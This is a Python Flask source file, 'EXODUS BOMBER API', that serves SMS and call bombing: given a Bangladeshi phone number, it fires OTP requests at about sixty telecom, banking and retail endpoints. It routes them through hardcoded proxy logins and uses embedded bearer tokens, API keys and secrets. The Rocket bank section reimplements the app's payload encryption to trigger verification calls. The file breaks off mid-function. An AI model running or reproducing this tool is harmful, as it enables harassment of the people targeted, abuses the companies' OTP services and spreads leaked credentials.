"""
============================================================
  EXODUS BOMBER API  (SMS + CALL + BOTH)
  Author   : @exodus_owner
  Version  : 3.0.0
  Usage    :
    SMS  : /?phone=01XXX&api=all&type=sms&limit=2
    CALL : /?phone=01XXX&api=all&type=call&limit=15
    BOTH : /?phone=01XXX&api=all&type=both&limit=2
    ONE  : /?phone=01XXX&api=robi&limit=3
============================================================
"""

import os, re, json, random, string, time, uuid, itertools, threading, base64, hashlib
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

DEVELOPER = "@exodus_owner"
VERSION   = "3.0.0"
TIMEOUT   = 20

# ═══════ 10 WEBSHARE PROXIES ═══════
PROXY_RAW = [
    "45.38.107.97:6014:crduvqii:nfc5g22vf09l",
    "64.137.96.74:6641:crduvqii:nfc5g22vf09l",
    "198.23.243.226:6361:crduvqii:nfc5g22vf09l",
    "38.154.185.97:6370:crduvqii:nfc5g22vf09l",
    "84.247.60.125:6095:crduvqii:nfc5g22vf09l",
    "191.96.254.138:6185:crduvqii:nfc5g22vf09l",
    "198.46.161.42:5092:crduvqii:nfc5g22vf09l",
    "64.137.10.153:5803:crduvqii:nfc5g22vf09l",
    "104.164.49.38:7693:crduvqii:nfc5g22vf09l",
    "23.26.71.145:5628:crduvqii:nfc5g22vf09l",
]

def _fmt(l):
    p = l.split(":")
    if len(p) == 4: return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2: return f"http://{p[0]}:{p[1]}"
    return None

PROXIES = [x for x in (_fmt(p) for p in PROXY_RAW) if x]
_cycle = itertools.cycle(PROXIES) if PROXIES else None
_lock  = threading.Lock()

def next_proxy():
    if not _cycle: return None
    with _lock: return next(_cycle)

# ═══════ HELPERS ═══════
def footer(d):
    d["developer"] = DEVELOPER; d["version"] = VERSION; return d

def send(url, data=None, headers=None, method="POST", cookies=None, form=False):
    try:
        kw = {"headers": headers or {}, "timeout": TIMEOUT, "verify": False}
        if cookies: kw["cookies"] = cookies
        if PROXIES:
            px = next_proxy()
            if px: kw["proxies"] = {"http": px, "https": px}
        if method.upper() == "POST":
            if isinstance(data, str):    kw["data"] = data
            elif isinstance(data, dict): kw["data" if form else "json"] = data
            r = requests.post(url, **kw)
        else:
            r = requests.get(url, **kw)
        try:    return r.json()
        except: return {"raw": r.text[:200], "code": r.status_code}
    except Exception as e:
        return {"error": str(e)[:120]}

def rnd(n=8): return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))
def valid_bd(p): return bool(re.match(r"^01[3-9][0-9]{8}$", p))

# ═══════════════════════════════════════════════════
#  ROCKET (DBBL) — CALL API
# ═══════════════════════════════════════════════════
ROCKET_PASSWORD    = "sdfheu$*sdfGw2"
ROCKET_AUTH        = "cm9ja2V0LWFwcC1lbmM6UmsjdDQwY2tFdCoj"
ROCKET_BASE        = "https://rocket-consumertxnservice.dutchbanglabank.com/apigw/v1"
ROCKET_DEVICE_ID   = "ANDROID-01968184976"
ROCKET_DEVICE_INFO = "SP1A.210812.016-itel S665L"
ROCKET_VERSION     = "3.1.6"
ROCKET_NID         = "5845888855"

def _rk_key(salt): return hashlib.pbkdf2_hmac("sha256", ROCKET_PASSWORD.encode(), salt, 65536, 32)

def _rk_encrypt(payload):
    raw = json.dumps(payload, separators=(",", ":")).encode()
    iv, salt = os.urandom(16), os.urandom(16)
    ct = AESGCM(_rk_key(salt)).encrypt(iv, raw, None)
    return base64.b64encode(iv + salt + ct).decode()

def _rk_decrypt(b64):
    raw = base64.b64decode(b64)
    iv, salt, ct = raw[:16], raw[16:32], raw[32:]
    return json.loads(AESGCM(_rk_key(salt)).decrypt(iv, ct, None).decode())

def _rk_ref(prefix="login"):
    now = time.time()
    dt = time.strftime("%Y%m%d%H%M%S", time.localtime(now))
    ms = str(int((now % 1) * 1000)).zfill(3)
    time.sleep(random.uniform(0.001, 0.05))
    return f"{prefix}--{dt}{ms}"

def _rk_call(endpoint, payload, token=None):
    h = {
        "Authorization": f"Bearer {token}" if token else f"Basic {ROCKET_AUTH}",
        "CHANNEL_ID": "ROCKET_APP_USER",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "rocket-consumertxnservice.dutchbanglabank.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.9.3",
    }
    body = json.dumps({"userData": _rk_encrypt(payload)})
    px = next_proxy()
    kw = {"timeout": 30, "verify": False, "headers": h, "data": body}
    if px: kw["proxies"] = {"http": px, "https": px}
    try:
        r = requests.post(f"{ROCKET_BASE}/{endpoint}", **kw)
        if r.status_code >= 400:
            return {"error": f"HTTP {r.status_code}"}
        j = r.json()
        return _rk_decrypt(j["userData"]) if j.get("userData") else j
    except Exception as e:
        return {"error": str(e)[:120]}

def api_rocket(p, nid=None):
    nid = nid or ROCKET_NID
    out = {"phone": p, "nid": nid, "steps": [], "success": False, "type": "CALL"}
    login = _rk_call("login", {
        "apiId": 102, "deviceId": ROCKET_DEVICE_ID,
        "deviceInfo": ROCKET_DEVICE_INFO, "clientVersion": ROCKET_VERSION,
        "refId": _rk_ref("login"), "sessionId": "123", "clientLanguage": "EN",
        "data": {"appType": "C", "rocketSessionId": "1234", "userId": p, "version": ROCKET_VERSION}
    })
    if login.get("status") != "SUCCESS":
        out["steps"].append({"step": "login", "status": "FAILED", "message": login.get("message", login.get("error", ""))})
        return out
    token = login["data"]["accessToken"]; sid = login["data"]["sessionId"]
    out["steps"].append({"step": "login", "status": "SUCCESS"})
    us = _rk_call("userService", {
        "apiId": 3042, "deviceId": ROCKET_DEVICE_ID, "deviceInfo": ROCKET_DEVICE_INFO,
        "clientVersion": ROCKET_VERSION, "refId": _rk_ref("reg-init"),
        "sessionId": sid, "clientLanguage": "EN",
        "data": {"appType": "C", "initiatorId": p, "rocketSessionId": "7654321",
                 "userId": "", "version": ROCKET_VERSION, "deviceType": "ANDROID"}
    }, token)
    utype = (us.get("data") or {}).get("userType", "?")
    promt = (us.get("data") or {}).get("promtUser", "")
    out["steps"].append({"step": "userService", "status": us.get("status"),
                         "userType": utype, "promtUser": promt,
                         "message": us.get("message", "")})
    if us.get("status") != "SUCCESS":
        out["error"] = us.get("message", "userService failed"); return out
    if utype == "NEW":
        nc = _rk_call("userService", {
            "apiId": 3002, "deviceId": ROCKET_DEVICE_ID, "deviceInfo": ROCKET_DEVICE_INFO,
            "clientVersion": ROCKET_VERSION, "refId": _rk_ref("nid-check"),
            "sessionId": sid, "clientLanguage": "EN",
            "data": {"nidNo": nid, "initiatorId": p}
        }, token)
        out["steps"].append({"step": "nid_check", "status": nc.get("status"), "message": nc.get("message", "")})
        ft = _rk_call("userService", {
            "apiId": 3034, "deviceId": ROCKET_DEVICE_ID, "deviceInfo": ROCKET_DEVICE_INFO,
            "clientVersion": ROCKET_VERSION, "refId": _rk_ref("reg-init"),
            "sessionId": "123", "clientLanguage": "EN",
            "data": {"appType": "C", "initiatorId": p, "rocketSessionId": "7654321",
                     "userId": "", "version": ROCKET_VERSION, "deviceType": "ANDROID"}
        }, token)
        out["steps"].append({"step": "final_trigger", "status": ft.get("status"), "message": ft.get("message", "")})
        if promt == "Y":
            out["success"] = True; out["call_will_come"] = True
    elif utype == "OLD":
        out["success"] = True; out["already_registered"] = True
    return out

# ═══════════════════════════════════════════════════
#  SMS API FUNCTIONS  (~40)
# ═══════════════════════════════════════════════════

def api_robi(p):
    return send("https://webapi.robi.com.bd/v1/account/register/otp", {"phone_number": p},
        {"User-Agent":"Mozilla/5.0","Content-Type":"application/json",
         "X-CSRF-TOKEN":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0",
         "Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0"})

def api_robi2(p):
    return send("https://webapi.robi.com.bd/v1/send-otp", {"phone_number":p,"type":"doorstep"},
        {"Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc","Content-Type":"application/json"})

def api_gp(p):
    return send("https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp", {"msisdn":p},
        {"Accept":"application/json","Content-Type":"application/json","Origin":"https://www.grameenphone.com","Referer":"https://www.grameenphone.com/","User-Agent":"Mozilla/5.0","lang":"en"})

def api_gp2(p):
    return send("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", {"phone":p,"email":"","language":"en"},
        {"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})

def api_gpay(p):
    return send("https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup",
        {"deviceId":f"35{p}30","msisdn":p,"tran_type":"OTPREQSIGNUP"},{"Content-Type":"application/json"})

def api_gpweblogin(p):
    return send("https://weblogin.grameenphone.com/backend/api/v1/otp",{"msisdn":p},
        {"Content-Type":"application/json","Origin":"https://weblogin.grameenphone.com","Referer":"https://weblogin.grameenphone.com/","User-Agent":"Mozilla/5.0"})

def api_banglalink(p):
    return send("https://myblapi.banglalink.net/api/v1/send-otp",{"phone":p},{"Content-Type":"application/json"})

def api_airtel(p):
    return send("https://api.bd.airtel.com/v1/account/login/otp",{"phone_number":p},
        {"Content-Type":"application/json","Origin":"https://www.bd.airtel.com","Referer":"https://www.bd.airtel.com/","User-Agent":"Mozilla/5.0"})

def api_airtel2(p):
    return send("https://api.bd.airtel.com/v1/account/register/otp",{"phone_number":p},
        {"Content-Type":"application/json","Origin":"https://www.bd.airtel.com","Referer":"https://www.bd.airtel.com/","User-Agent":"Mozilla/5.0"})

def api_shikho(p):
    return send("https://api.shikho.com/auth/v2/send/sms",
        {"phone":p,"type":"student","auth_type":"signup","vendor":"shikho"},
        {"Host":"api.shikho.com","Content-Type":"application/json","Origin":"https://app.shikho.com","Referer":"https://app.shikho.com/","User-Agent":"Mozilla/5.0"})

def api_ghoori(p):
    return send("https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        json.dumps({"mobile_no":p}),
        {"content-type":"application/json","origin":"https://ghoorilearning.com","referer":"https://ghoorilearning.com/","user-agent":"Mozilla/5.0"})

def api_quizgiri(p):
    return send("https://developer.quizgiri.xyz:443/api/v2.0/send-otp",{"phone":p,"country_code":"+880"},{"Content-Type":"application/json"})

def api_quiztime(p):
    return send("https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp",{"country_code":"+88","phone":p},{"Content-Type":"application/json"})

def api_chorcha(p):
    return send(f"https://mujib.chorcha.net/auth/check?phone={p}",method="GET",
        headers={"accept":"*/*","x-chorcha-mode":"prod","x-chorcha-platform":"web"})

def api_medha(p):
    return send("https://developer.medha.info/api/send-otp",
        {"phone":"880"+p.lstrip("0"),"is_register":"1"},
        {"User-Agent":"Dart/3.2 (dart:io)","content-type":"application/json; charset=utf-8","authorization":"Bearer"})

def api_iqra(p):
    return send(f"http://apibeta.iqra-live.com/api/v1/sent-otp/{p}",method="GET")

def api_chokrojan(p):
    return send("https://chokrojan.com/api/v1/passenger/login/mobile",
        {"mobile_number":p,"otp_token":"826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"},
        {"Content-Type":"application/json;charset=UTF-8","Origin":"https://chokrojan.com","Referer":"https://chokrojan.com/login","User-Agent":"Mozilla/5.0","company-id":"1","domain-name":"chokrojan.com","user-platform":"3"})

def api_shomvob(p):
    return send("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",{"phone":"88"+p},
        {"User-Agent":"Dalvik/2.1.0","Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s","Content-Type":"application/json; charset=utf-8"})

def api_wafilife(p):
    return send(f"https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={p}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3",method="GET")

def api_sindabad(p):
    return send("https://offers.sindabad.com/api/mobile-otp",{"key":"c94e67fb2a59af3b6fa21f24463b2061","mobile":"+88"+p},
        {"Content-Type":"application/json","Origin":"https://sindabad.com","Referer":"https://sindabad.com/","User-Agent":"Mozilla/5.0","Authorization":"Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgd2luZG93cyBudCAxMDAgd2luNjQgeDY0IGFwcGxld2Via2l0NTM3MzYga2h0bWwgbGlrZSBnZWNrbyBjaHJvbWUxNDMwMDAgc2FmYXJpNTM3MzZiYW5kb3JjOTRlNjdmYjJhNTlhZjNiNmZhMjFmMjQ0NjNiMjA2MQ=="})

def api_bdstall(p):
    return send("https://www.bdstall.com/userRegistration/save_otp_info/",
        {"UserTypeID":"2","RequestType":"1","Name":"Md","Mobile":p},
        {"Content-Type":"application/x-www-form-urlencoded"},form=True)

def api_khaasfood(p):
    csrf="9d9d08e6e5"; u="https://www.khaasfood.com/wp-admin/admin-ajax.php"
    h={"content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"https://www.khaasfood.com","referer":"https://www.khaasfood.com/","x-requested-with":"XMLHttpRequest","user-agent":"Mozilla/5.0"}
    r1=send(u,{"mobileNo":p,"countrycode":"+880","csrf":csrf,"login":"1","json":"1","action":"digits_check_mob"},h,form=True)
    r2=send(u,{"mobileNo":p,"digits_reg_mail":p,"dig_nounce":csrf,"action":"digits_check_mob","login":"2","countrycode":"+880","digregcode":"+880","digregcode2":"+880","digits":"1","dtype":"2","json":"1","csrf":csrf},h,form=True)
    return {"step1":r1,"step2":r2}

def api_walton(p):
    return send("https://api.waltonplaza.com.bd/graphql",
        {"operationName":"createCustomerOtp","variables":{"auth":{"countryCode":"880","deviceUuid":"998283c0-622a-11ee-84c0-190466a47baa","phone":p},"device":None},
         "query":"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message statusCode result { id __typename } __typename } }"},
        {"Content-Type":"application/json"})

def api_sundora(p):
    return send("https://api.sundora.com.bd/api/user/customer/",
        {"customer":{"email":f"kgjkgjgg{p}@gmail.com","password":"#bUV?'3*N#7N}.g","password_confirmation":"#bUV?'3*N#7N}.g","phone":"+880"+p[1:],"draft_order_id":None,"first_name":"sdfgfd","last_name":"fgfd","note":{"birthday":"","gender":"male"},"withTimeout":True,"newsletter_email":True,"newsletter_sms":True}},
        {"Content-Type":"application/json","Referer":"https://sundora.com.bd/","Origin":"https://sundora.com.bd","User-Agent":"Mozilla/5.0"})

def api_bioscope(p):
    return send("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number":"+88"+p},{"accept":"application/json","content-type":"application/json","origin":"https://www.bioscopeplus.com","referer":"https://www.bioscopeplus.com/","user-agent":"Mozilla/5.0"})

def api_deeptoplay(p):
    return send("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number":"+88"+p},{"accept":"application/json","content-type":"application/json","origin":"https://www.deeptoplay.com","referer":"https://www.deeptoplay.com/","user-agent":"Mozilla/5.0"})

def api_cinematic(p):
    return send(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{p}",
        {"headers":{"Content-Type":"application/json","Access-Control-Allow-Origin":"*","Authorization":"Bearer 1pake4mh5ln64h5t26kpvm3iri"}},
        {"Accept":"application/json","Content-Type":"application/json;charset=UTF-8","Origin":"https://cinematic.mobi","Referer":"https://cinematic.mobi/","User-Agent":"Mozilla/5.0"})

def api_bdtickets(p):
    return send("https://api.bdtickets.com:20100/v1/auth",
        {"createUserCheck":True,"phoneNumber":"+88"+p,"applicationChannel":"WEB_APP"},
        {"content-type":"application/json","origin":"https://bdtickets.com","referer":"https://bdtickets.com/","user-agent":"Mozilla/5.0"})

def api_bikroy(p):
    return send(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={p}",method="GET",
        headers={"accept":"application/json","application-name":"web","referer":"https://bikroy.com/en","user-agent":"Mozilla/5.0"})

def api_redx(p):
    return send("https://api.redx.com.bd/v1/user/signup",{"name":p,"service":"redx","phoneNumber":p},{"Content-Type":"application/json"})

def api_redx2(p):
    return send("https://api.redx.com.bd:443/v1/user/signup",{"name":"Alamin Sheikh","phoneNumber":p,"service":"redx"},{"Content-Type":"application/json"})

def api_rflbestbuy(p):
    return send("https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT",
        {"company_id":"26","password2":"Riyaz@123","currency_code":"BDT","user_type":"C","email":f"{p}@gmail.com","g_id":"","lang_code":"en","operating_system":"Android","otp_verify":False,"password1":"Riyaz@123","phone":p,"storefront_id":"3"},
        {"Host":"rflbestbuy.com","Authorization":"Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==","Content-Type":"application/json","User-Agent":"okhttp/4.2.2"})

def api_circle(p):
    return send("https://reseller.circle.com.bd/api/v2/auth/signup",
        {"name":"+88"+p,"email_or_phone":"+88"+p,"password":"123456","password_confirmation":"123456","register_by":"phone"},
        {"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})

def api_bcsexamaid(p):
    return send("https://bcsexamaid.com/api/generateotp",{"mobile":p,"softtoken":"Rifat.Admin.2022"},
        {"User-Agent":"Dart/3.1 (dart:io)","Accept":"application/json","Content-Type":"application/json; charset=utf-8"})

def api_sheba(p):
    t=send("https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=8329815A6D1AE6DD",method="GET")
    tok=t.get("token","") if isinstance(t,dict) else ""
    o=send("https://accountkit.sheba.xyz/api/shoot-otp",{"mobile":"+88"+p,"app_id":"8329815A6D1AE6DD","api_token":tok},{"Content-Type":"application/json"})
    return {"token_step":t,"otp_step":o}

def api_apex4u(p):
    return send("https://api.apex4u.com/api/auth/login",{"phoneNumber":p},
        {"accept":"application/json","content-type":"application/json","origin":"https://apex4u.com","referer":"https://apex4u.com/","user-agent":"Mozilla/5.0"})

def api_kireibd(p):
    return send("https://app.kireibd.com/api/v2/send-login-otp",{"email":p},
        {"Content-Type":"application/json","user-agent":"Mozilla/5.0",
         "x-xsrf-token":"eyJpdiI6Imh2dU9zVk9rQUR5TjlsQVBvd2F2cVE9PSIsInZhbHVlIjoiQlZUdXlHcmpES2FGUXBja1dZbUZXZG9MVksreEwxa1ZzZGgzYml3MHIxMmlraURSTjVLUnpPY0ZEeEJmSldqNGNaOG5rc0FNYkVDMlJqakJmZGVlckdvNVFobnBzTFpOSnpsbVZENlVvUW5JSHhvMkYxd1VKcG9Zc0tmTUlEdUQiLCJtYWMiOiJiZjIwNmQ0OWNlZTFiYWMyZWQ4YWRmMTEzYjAwNWFkOTNmOTgzMzRiODJlZWMxOWM0MTFhOGNkODhjNzQzZWQxIiwidGFnIjoiIn0="})

def api_arogga(p):
    body = ("------WebKitFormBoundaryYpsCATbORcIEoBtS\r\n"
            f"Content-Disposition: form-data; name=\"mobile\"\r\n\r\n{p}\r\n"
            "------WebKitFormBoundaryYpsCATbORcIEoBtS\r\n"
            "Content-Disposition: form-data; name=\"fcmToken\"\r\n\r\n\r\n"
            "------WebKitFormBoundaryYpsCATbORcIEoBtS\r\n"
            "Content-Disposition: form-data; name=\"referral\"\r\n\r\n\r\n"
            "------WebKitFormBoundaryYpsCATbORcIEoBtS--")
    return send("https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10", body,
        {"content-type":"multipart/form-data; boundary=----WebKitFormBoundaryYpsCATbORcIEoBtS","origin":"https://www.arogga.com","referer":"https://www.arogga.com/","user-agent":"Mozilla/5.0"})

def api_arogga2(p):
    return send("https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33",
        {"mobile":p,"fcmToken":"cQYjPWHHTDu1IVXnW90Xqs:APA91bHB71xe_ai41Vm-aq9DFkukrF9mAH13DPAIInmus7pykdI49PZTgqy4Qy5x8Q5TG6zd1HIOIGDCV8UH5K5l3rc1Z36R-km9T-NhotH3TBjhJOZ43Kw2xqr8lr3vuWgTMUHybMnR","referral":""},
        {"User-Agent":"okhttp/4.9.2","Content-Type":"application/x-www-form-urlencoded"},form=True)

def api_osudpotro(p):
    return send("https://api.osudpotro.com/api/v1/users/send_otp",
        {"mobile":"+88-"+p,"deviceToken":"web","language":"en","os":"web"},
        {"Content-Type":"application/json","Origin":"https://osudpotro.com","Referer":"https://osudpotro.com/","User-Agent":"Mozilla/5.0"})

def api_hishabexpress(p):
    return send("https://api.hishabexpress.com/login/status",{"msisdn":p,"hash":"Hello"},
        {"user-agent":"Dart/2.19 (dart:io)","Content-Type":"application/x-www-form-urlencoded"},form=True)

def api_kabbik(p):
    return send("https://api.kabbik.com/v1/auth/otpnew",
        {"msisdn":"88"+p,"currentTimeLong":int(time.time()*1000),"passKey":"qOQNBtVmoTTPVmfn"},
        {"Content-Type":"application/json","origin":"https://kabbik.com","referer":"https://kabbik.com/","user-agent":"Mozilla/5.0",
         "authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0.dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc"})

def api_applink(p):
    return send("https://apps.applink.com.bd/appstore-v4-server/login/otp/request",
        {"msisdn":"88"+p},{"Content-Type":"application/json","origin":"https://applink.com.bd","referer":"https://applink.com.bd/","user-agent":"Mozilla/5.0"})

def api_priyos(p):
    return send("https://app.priyoshikkhaloy.com/api/user/register-login.php",{"mobile":p},
        {"User-Agent":"okhttp/4.11.0","Content-Type":"application/x-www-form-urlencoded"},form=True)

def api_salextra(p):
    return send("https://salextra.com.bd/customer/checkusernameavailabilityonregistration",
        {"username":p,"loginType":"MOBILE","__RequestVerificationToken":"CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg"},
        {"content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"https://salextra.com.bd","referer":"https://salextra.com.bd/register","user-agent":"Mozilla/5.0","x-requested-with":"XMLHttpRequest"},form=True)

def api_drl(p):
    return send("https://doctorlivebd.com/api/patient/auth/otpsend",
        {"country_code":"880","mobile":p.lstrip("0")},
        {"User-Agent":"okhttp/4.10.0","Content-Type":"application/x-www-form-urlencoded"},form=True)

def api_sundarban(p):
    return send("https://api-gateway.sundarbancourierltd.com/graphql",
        {"operationName":"CreateAccessToken","variables":{"accessTokenFilter":{"userName":p}},
         "query":"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"},
        {"Content-Type":"application/json","Host":"api-gateway.sundarbancourierltd.com","Referer":"https://customer.sundarbancourierltd.com/","Origin":"https://customer.sundarbancourierltd.com"})

def api_btcl(p):
    return send("https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json",
        {"OTPType":15,"userName":p,"isNewPhoneOrEmail":False},
        {"content-type":"application/json","origin":"https://phonebill.btcl.com.bd","referer":"https://phonebill.btcl.com.bd/login","user-agent":"Mozilla/5.0","token":""},
        cookies={"token":""})

def api_pbs(p):
    return send("https://apialpha.pbs.com.bd/api/OTP/generateOTP",{"userPhone":p,"otp":""},
        {"content-type":"application/json","origin":"https://pbs.com.bd","referer":"https://pbs.com.bd/","user-agent":"Mozilla/5.0"})

def api_dressup(p):
    return send("https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp",
        {"country_code":"+880","mobile":p.lstrip("0"),"type":"login","whatsapp":False},
        {"User-Agent":"Dart/3.5 (dart:io)","content-type":"application/json; charset=utf-8"})

def api_garibook(p):
    return send("https://api.garibookadmin.com/api/v3/user/login",
        {"mobile":p,"recaptcha_token":"garibookcaptcha","channel":"web"},
        {"content-type":"application/json","origin":"https://garibook.com","referer":"https://garibook.com/","user-agent":"Mozilla/5.0"})

def api_kfc(p):
    return send("https://api.kfcbd.com/register",
        {"id":None,"name":"Sojib khane","email":f"monirk2ib+{rnd(8)}@gmail.com","mobile":p,"address":None,
         "device_token":"dLvYmVLqT02A_ZAFsFa8gJ:APA91bHC8CtSoO-TaN-NFm4obg10-Blc1vji2lbq82KbIyEGsXobCa8hZs-XbWjyTYnLE7KgYDRWKdteBgU6zvixuYG-vV4aGCEvkItCk6DiXYKVvd_ecWxqraqX6vyYJMfWDWDeF1EG",
         "token":None,"dob":"","otp":None},
        {"User-Agent":"Dart/3.1 (dart:io)","Content-Type":"application/json"})

def api_foodaholic(p):
    return send("https://foodaholic.com.bd/api/v1/auth/forgot-password",{"phone":"+88"+p.lstrip("0")},
        {"User-Agent":"Dart/3.2 (dart:io)","Content-Type":"application/json; charset=UTF-8","authorization":"Bearer null","x-localization":"en"})

def api_eatzy(p):
    return send("https://api.eat-z.com/auth/customer/app-connect",{"username":"+880"+p.lstrip("0")},
        {"User-Agent":"okhttp/4.12.0","x-eatz-apiclient":"ANDROID","content-type":"application/json; charset=UTF-8"})

def api_eonbazar(p):
    reg=send("https://app.eonbazar.com/api/auth/register",
        {"mobile":p,"name":rnd(8).capitalize(),"password":"Soji12345","email":f"{rnd(10)}@gmail.com"},
        {"Content-Type":"application/json","carttoken":str(uuid.uuid4()),"ordersource":"web","origin":"https://eonbazar.com","referer":"https://eonbazar.com/"})
    log=send("https://app.eonbazar.com/api/auth/login",{"method":"otp","mobile":p.lstrip("0")},
        {"content-type":"application/json","carttoken":str(uuid.uuid4()),"origin":"https://eonbazar.com","referer":"https://eonbazar.com/"})
    return {"register":reg,"login_otp":log}

def api_sw(p):
    return send("https://www.shwapno.com/api/auth",{"phoneNumber":"+88"+p},
        {"content-type":"application/json","origin":"https://www.shwapno.com","referer":"https://www.shwapno.com/","user-agent":"Mozilla/5.0"})

def api_proiojon(p):
    r=rnd(12)
    return send("https://billing.proiojon.com/api/v1/auth/sign-up",
        {"name":r[:10],"phone":p,"email":r+"@gmail.com","password":"password123","ref_code":""},
        {"content-type":"application/json; charset=UTF-8","origin":"https://proiojon.com","referer":"https://proiojon.com/","user-agent":"Mozilla/5.0","x-localization":"en","zoneid":"[2]"})

def api_beautybooth(p):
    return send("https://admin.beautybooth.com.bd/api/v2/auth/signup",{"phone":p},
        {"User-Agent":"Dart/2.19 (dart:io)","Content-Type":"application/json; charset=utf-8"})

def api_binge(p):
    return send(f"https://web-api.binge.buzz/api/v3/otp/send/{p}",method="GET",
        headers={"Accept":"application/json","Device-Type":"web","Origin":"https://binge.buzz","Referer":"https://binge.buzz/","User-Agent":"Mozilla/5.0",
                 "Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJGcmVlIiwiY3JlYXRlZEF0IjoiY3JlYXRlIGRhdGUiLCJ1cGRhdGVkQXQiOiJ1cGRhdGUgZGF0ZSIsInR5cGUiOiJ0b2tlbiIsImRldlR5cGUiOiJ3ZWIiLCJleHRyYSI6IjMxNDE1OTI2IiwiaWF0IjoxNzAzODUwMjYxLCJleHAiOjE3MDQwMjMwNjF9.nCgP-U4r6CYuTO_i4Nz97YiaI2jsi45d2n-9ZQN3qt0"})

def api_etestpaper(p):
    h={"content-type":"application/json","origin":"https://www.etestpaper.net","referer":"https://www.etestpaper.net/","user-agent":"Mozilla/5.0"}
    return {"exists":send("https://prod.etestpaper.net/api/exists",{"phone":p},h),
            "otp":send("https://prod.etestpaper.net/api/v4/auth/otp",{"phone":p,"recaptcha":"668be73dcad2999a957ff440"},h)}

def api_chardike(p):
    return send("https://api.chardike.com/api/otp/send",{"phone":p,"otp_type":"login"},
        {"content-type":"application/json","origin":"https://chardike.com","referer":"https://chardike.com/","user-agent":"Mozilla/5.0"})

def api_doctime(p):
    return send("https://api.doctime.com.bd/api/authenticate",{"contact_no":p,"country_calling_code":"88"},
        {"User-Agent":"okhttp/4.12.0","Content-Type":"application/json","app-version":"0.29.11","platform":"Android","locale":"bn"})

# --- PDF New APIs ---
def api_cokestudio(p):
